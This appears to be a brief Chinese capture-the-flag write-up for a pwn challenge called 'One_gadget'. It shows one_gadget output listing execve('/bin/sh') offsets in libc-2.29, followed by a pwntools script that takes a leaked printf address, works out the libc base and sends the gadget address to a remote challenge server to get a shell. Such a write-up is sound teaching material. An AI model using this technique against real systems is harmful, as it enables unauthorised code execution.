

# One_gadget



这里有各种版本的[so文件](https://buuoj.cn/resources)

```c
$ one_gadget libc-2.29.so 
0xe237f execve("/bin/sh", rcx, [rbp-0x70])
constraints:
  [rcx] == NULL || rcx == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xe2383 execve("/bin/sh", rcx, rdx)
constraints:
  [rcx] == NULL || rcx == NULL
  [rdx] == NULL || rdx == NULL

0xe2386 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

0x106ef8 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

![LQibhM](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/LQibhM.png)

![awPOkl](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/awPOkl.png)



解题脚本

```python
#!/usr/bin/python
from pwn import *


#p=process("one_gadget.dms",env={"LD_PRELOAD":"libc-2.29.so"})
p=remote("111.73.46.229",25662)
#gdb.attach(p,"b *0x7ffff7b44b86")
libc=ELF('libc-2.29.so')

p.recvuntil("here is the gift for u:")
s=p.recv(14)
offset=libc.symbols['printf']
print "printf:"+hex(offset)
libc_addr=int(s,16)-offset
print "leak:"+s
print "libc_addr:"+hex(libc_addr)

one_gadget=0x106ef8+libc_addr
print "one_gadget:"+hex(one_gadget)
p.recvuntil("Give me your one gadget:")
p.sendline(str(one_gadget))
p.interactive()

'''

$ one_gadget libc-2.29.so 
0xe237f execve("/bin/sh", rcx, [rbp-0x70])
constraints:
  [rcx] == NULL || rcx == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xe2383 execve("/bin/sh", rcx, rdx)
constraints:
  [rcx] == NULL || rcx == NULL
  [rdx] == NULL || rdx == NULL

0xe2386 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

0x106ef8 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''
```

![LLJzEZ](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/LLJzEZ.png)